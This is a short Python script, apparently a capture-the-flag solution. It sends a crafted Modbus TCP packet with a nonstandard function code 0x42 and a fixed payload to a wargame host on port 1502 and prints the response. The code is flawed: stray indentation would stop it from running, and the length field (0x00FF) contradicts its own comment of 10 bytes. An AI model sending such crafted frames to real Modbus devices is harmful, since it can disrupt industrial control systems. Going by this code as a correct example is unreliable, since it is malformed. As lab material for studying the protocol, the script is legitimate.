import socket

HOST = 'modbus_scolaire.wargame.rocks'
PORT = 1502

payload = b'\x13\x37\xBE\xEF\x01\x00\x00\x00'


  packet = (
      b'\x00\x01' +               # Transaction ID
      b'\x00\x00' +               # Protocol ID
      b'\x00\xFF' +               # Length (10 bytes after this field)
      b'\x01' +                   # Unit ID
      b'\x42' +                   # Function code 0x42
      payload                     # 8 bytes payload
  )

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(packet)
        data = s.recv(1024)
        print(f"Sent payload: {payload} | Received: {data}")
